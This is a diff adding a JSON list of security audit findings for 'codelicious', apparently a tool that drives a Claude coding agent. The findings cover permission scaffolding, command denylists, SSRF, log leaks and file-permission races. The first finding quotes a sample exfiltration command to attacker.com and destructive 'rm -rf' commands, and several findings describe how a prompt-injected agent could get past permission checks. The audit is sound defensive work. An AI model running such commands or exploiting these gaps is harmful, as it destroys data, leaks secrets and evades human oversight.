@@ -1,0 +1,122 @@
+[
+  {
+    "severity": "P1",
+    "file": "src/codelicious/scaffolder.py",
+    "line": 424,
+    "title": "Scaffolded settings.json grants Bash(*) with incomplete deny list — sandbox bypass",
+    "description": "The _build_permissions function scaffolds .claude/settings.json with 'Bash(*)' in the allow list and only 8 deny patterns. The deny list blocks 'Bash(rm -rf /*)' (absolute root) but NOT 'Bash(rm -rf .)' (project directory), 'Bash(rm -rf ~)' (home directory), or data exfiltration commands like 'Bash(curl -X POST https://attacker.com -d @.env)'. When the Claude agent operates WITHOUT --dangerously-skip-permissions, these permissions are the ONLY security boundary. A confused or prompt-injected agent can wipe the project, exfiltrate secrets, or install backdoors through the allowed Bash wildcard.",
+    "fix": "Switch to an explicit allowlist model for Bash permissions: 'Bash(pytest *)', 'Bash(ruff *)', 'Bash(npm test *)', etc. Remove the 'Bash(*)' wildcard entirely. If broad Bash access is needed, expand the deny list to cover: 'Bash(rm *)', 'Bash(curl *)', 'Bash(wget *)', 'Bash(nc *)', 'Bash(dd *)', 'Bash(mv /* *)', and 'Bash(> /*)' at minimum."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/agent_runner.py",
+    "line": 141,
+    "title": "CODELICIOUS_ALLOW_DANGEROUS env var enables --dangerously-skip-permissions from untrusted .env files",
+    "description": "The allow_dangerous flag can be activated via the CODELICIOUS_ALLOW_DANGEROUS environment variable (line 142-143). If a user clones a malicious repository containing a .env file that sets this variable, and their shell is configured to auto-source .env files (e.g., via direnv, dotenv, or IDE integrations), the agent will run with --dangerously-skip-permissions without the user's explicit consent. This bypasses ALL Claude Code permission checks including the scaffolded allow/deny lists.",
+    "fix": "Remove the environment variable path entirely — require the user to pass --allow-dangerous on the CLI explicitly. If the env var must be kept, require a specific multi-word value (e.g., 'I-UNDERSTAND-THE-RISKS') instead of accepting '1', 'true', 'yes' which are trivially guessable. Also log a prominent WARNING when the flag is activated via env var."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/tools/command_runner.py",
+    "line": 74,
+    "title": "Command denylist missing make, pip, npx which execute arbitrary code",
+    "description": "The DENIED_COMMANDS list (security_constants.py) blocks interpreters and known-dangerous binaries but misses 'make' (executes arbitrary Makefile recipes), 'pip'/'pip3' (pip install runs setup.py which can execute arbitrary code), 'npx' (executes arbitrary npm packages), 'cargo' with build.rs (compiles and runs build scripts), and 'go run' (compiles and executes Go code). Since run_command is exposed to the LLM agent via tool dispatch, the agent can invoke 'make backdoor' or 'pip install malicious-package' to achieve arbitrary code execution.",
+    "fix": "Add 'make', 'pip', 'pip3', 'pipx', 'npx', 'go' to DENIED_COMMANDS. For legitimate build/test operations, provide dedicated tools that invoke these commands with constrained arguments (e.g., a 'run_tests' tool that only allows 'pytest' with safe flags) rather than giving the agent a general 'run any command' capability."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/engines/huggingface_engine.py",
+    "line": 83,
+    "title": "Unbounded message history causes memory exhaustion over long build sessions",
+    "description": "The messages list (line 83) grows without limit over up to 50 iterations. Each iteration appends the LLM response and tool results. Tool results include full file contents from read_file (which can be megabytes) and full command output from run_command. With 50 iterations and large files, the messages list can consume gigabytes of RAM and the JSON payload to the LLM API will exceed request size limits, causing silent failures or OOM crashes.",
+    "fix": "Implement a sliding window or token budget for the messages list. Options: (1) Truncate tool result content to a maximum length (e.g., 10KB). (2) Remove tool results older than N iterations, keeping only the assistant/user messages. (3) Summarize old context periodically. (4) Track total token count and drop oldest messages when approaching the model's context window limit."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/engines/huggingface_engine.py",
+    "line": 127,
+    "title": "Error messages containing sensitive info fed back to LLM context",
+    "description": "When an LLM API call fails (line 109), the exception message is appended to the conversation: f'The previous LLM call failed with: {e}'. Exception messages from HTTP errors may contain: the API endpoint URL, partial request/response bodies, authentication error details, or internal server error messages from the provider. This data is then sent to the LLM in the next iteration, potentially leaking infrastructure details into the model context where they could be reflected in generated code or output.",
+    "fix": "Sanitize the error message before appending to the conversation. Use sanitize_message() from codelicious.logger, or replace the raw exception with a generic message: 'The previous API call failed. Please continue your work.' Only log the full error details to the local log file."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/config.py",
+    "line": 123,
+    "title": "PolicyBind endpoint URL not validated — SSRF via CODELICIOUS_POLICYBIND_ENDPOINT",
+    "description": "The PolicyConfig.from_env() method reads CODELICIOUS_POLICYBIND_ENDPOINT (line 123) as an arbitrary URL without any validation. Unlike the LLM endpoint which has _validate_endpoint_url(), the policy endpoint accepts any scheme and any host. If policy integration is enabled and an attacker can set this env var (via .env file, CI misconfiguration, or shared compute), they can redirect policy API calls to an attacker-controlled server, potentially receiving auth tokens or organizational metadata.",
+    "fix": "Apply the same _validate_endpoint_url() validation from llm_client.py to the policybind endpoint. Require HTTPS (except for localhost in development). Also validate the URL in PolicyConfig.from_env() before storing it, not just when making requests."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/git/git_orchestrator.py",
+    "line": 177,
+    "title": "Sensitive file detection uses narrow substring matching — misses common secret patterns",
+    "description": "The _is_sensitive_file method (line 177-183) checks if any SENSITIVE_PATTERNS substring appears in the filename. The patterns ('.env', '.pem', '.key', 'secret', 'credential', 'token', 'id_rsa', 'id_ed25519', 'password', 'private') miss common secret file patterns: 'api-keys.json', 'secrets.yaml', '.npmrc' (contains npm tokens), '.pypirc' (contains PyPI tokens), '.netrc' (contains login credentials), 'kubeconfig', '.docker/config.json', 'service-account.json' (GCP), '.aws/credentials' (when copied into repo). A file named 'config.json' containing 'api_key' fields would not be caught.",
+    "fix": "Expand SENSITIVE_PATTERNS with: '.npmrc', '.pypirc', '.netrc', 'kubeconfig', 'service-account', 'aws-credentials', 'docker-config'. Also consider checking file CONTENTS for secret patterns (using the patterns from logger.py's _REDACT_PATTERNS) on staged files, not just filenames."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/sandbox.py",
+    "line": 409,
+    "title": "read_file follows symlinks with TOCTOU window allowing information disclosure",
+    "description": "The read_file method (line 409-417) calls resolve_path which uses os.path.realpath to resolve symlinks and checks the resolved path is within project_dir. However, between the resolve_path check (line 412) and the actual read_text call (line 417), a concurrent process could replace the file with a symlink pointing outside the project directory. While this is a read (not a write), it allows information disclosure: an attacker with concurrent filesystem access could read /etc/passwd, SSH keys, or other sensitive files through the sandbox.",
+    "fix": "Open the file with O_NOFOLLOW flag to prevent symlink following, or perform a post-read verification (similar to write_file's post-write check) by re-resolving the path after reading and discarding the content if the path escaped. For most practical purposes, the current TOCTOU window is very narrow and the attack requires concurrent filesystem access, making this P2 rather than P1."
+  },
+  {
+    "severity": "P2",
+    "file": "src/codelicious/agent_runner.py",
+    "line": 401,
+    "title": "Full agent command including prompt logged at DEBUG level — secrets in logs",
+    "description": "Line 401 logs the full command: 'logger.debug(\"Full command: %s\", \" \".join(cmd))'. The cmd list includes the prompt text passed via -p (line 164), which may contain file contents, error messages, spec text, or other sensitive data from the project. While the SanitizingFilter catches known secret patterns, it cannot redact arbitrary sensitive data (e.g., proprietary code, internal API endpoints, database schemas). The debug log is written to .codelicious/codelicious.log which persists on disk with 0o600 permissions.",
+    "fix": "Truncate or omit the prompt from the debug log. Log only the command structure (binary, flags, model, effort, max_turns) without the prompt content. If full prompt logging is needed for debugging, write it to a separate file with a clear warning about sensitive content."
+  },
+  {
+    "severity": "P3",
+    "file": "src/codelicious/tools/audit_logger.py",
+    "line": 104,
+    "title": "Audit and security log files grow without bounds — disk exhaustion",
+    "description": "The AuditLogger writes to audit.log and security.log (lines 104, 130) using simple file append without any rotation or size limit. Over a long-running build session with many tool calls, these files can grow to gigabytes. Unlike codelicious.log which uses RotatingFileHandler (10MB max, 1 backup), audit logs have no size cap. A confused agent making thousands of tool calls (even within the per-iteration limit) across many iterations could fill the disk.",
+    "fix": "Use logging.handlers.RotatingFileHandler instead of raw file writes, or check file size before each write and rotate when a threshold (e.g., 50MB) is exceeded. Alternatively, integrate audit logging with the standard logging infrastructure which already has rotation configured."
+  },
+  {
+    "severity": "P3",
+    "file": "src/codelicious/git/git_orchestrator.py",
+    "line": 156,
+    "title": "Branch name derived from spec filename not sanitized for git-unsafe characters",
+    "description": "The branch_for_spec method constructs branch names as f'codelicious/{stem}' using Path.stem directly. Spec filenames could contain characters valid in filenames but invalid in git branch names: spaces, tildes (~), colons (:), question marks (?), asterisks (*), brackets ([]), or backslashes (\\). Git would reject these with an error, and the error handling in checkout_or_create_feature_branch just logs and re-raises, potentially leaving the build in a broken state.",
+    "fix": "Sanitize the stem: re.sub(r'[^a-zA-Z0-9_-]+', '-', stem).strip('-'). Also collapse consecutive hyphens and enforce a maximum branch name length (git has a 255-byte limit on ref names)."
+  },
+  {
+    "severity": "P3",
+    "file": "src/codelicious/agent_runner.py",
+    "line": 164,
+    "title": "Full prompt visible in process list via CLI argument",
+    "description": "The sanitized prompt is passed as a command-line argument via '-p' (line 164), making it visible in 'ps aux' output and /proc/pid/cmdline to all users on the system. Prompts contain spec file paths, project names, and build instructions which may reveal information about the project being built. On shared CI systems or multi-user servers, this is an information disclosure risk.",
+    "fix": "Pass the prompt via stdin instead of command-line arguments. The Claude CLI supports reading prompts from stdin (pipe mode). Example: use Popen with stdin=PIPE and write the prompt to proc.stdin. This prevents prompt contents from appearing in the process list."
+  },
+  {
+    "severity": "P3",
+    "file": "src/codelicious/build_logger.py",
+    "line": 127,
+    "title": "Session directory created with default permissions before chmod — brief exposure window",
+    "description": "The session directory is created via mkdir (line 127) with default permissions (typically 0o755), then chmod sets 0o700 (line 128). Between these two operations, on a multi-user system, another user could list/access the directory contents. The window is extremely brief (microseconds) but exists. Similarly, meta.json, output.log, and session.jsonl are written before their permissions are set.",
+    "fix": "Use os.umask(0o077) before creating the directory and files, or use os.open with O_CREAT and explicit mode for file creation. Alternatively, create files with restrictive permissions from the start by passing mode to mkstemp or using atomic_write_text which already handles this."
+  },
+  {
+    "severity": "P3",
+    "file": "src/codelicious/llm_client.py",
+    "line": 76,
+    "title": "API key stored as plain string attribute remains in memory indefinitely",
+    "description": "The LLMClient stores the API key as self.api_key (a plain Python string at line 76) which persists in memory for the lifetime of the object. Python strings are immutable and cannot be securely zeroed. Memory dumps, core dumps, or /proc/pid/mem reads could expose the key. The key is also sent in HTTP headers on every request (line 149), so it exists in multiple buffer copies.",
+    "fix": "This is inherent to Python's memory model and difficult to fully mitigate. Consider: (1) reading the key from the environment on each request rather than caching it, (2) ensuring core dumps are disabled in production (ulimit -c 0), (3) using a secrets manager or keyring integration instead of raw environment variables."
+  },
+  {
+    "severity": "P3",
+    "file": "src/codelicious/context/rag_engine.py",
+    "line": 36,
+    "title": "SQLite database stores source code chunks without encryption or access controls",
+    "description": "The RAG engine stores chunks of source code as plaintext in .codelicious/db.sqlite3 (line 36). The database file is created with default permissions (no explicit chmod). If the project contains proprietary code, trade secrets, or credentials in configuration files, these are persisted in the SQLite database even after the source files are deleted or .gitignore'd. The database file is under .codelicious/ which is excluded from the sandbox's denied patterns, meaning the agent cannot write to it directly, but it persists across builds.",
+    "fix": "Set file permissions to 0o600 on the database file after creation. Add the database to .gitignore to prevent accidental commits. Consider offering an option to encrypt the database or to purge it after each build session."
+  }
+]
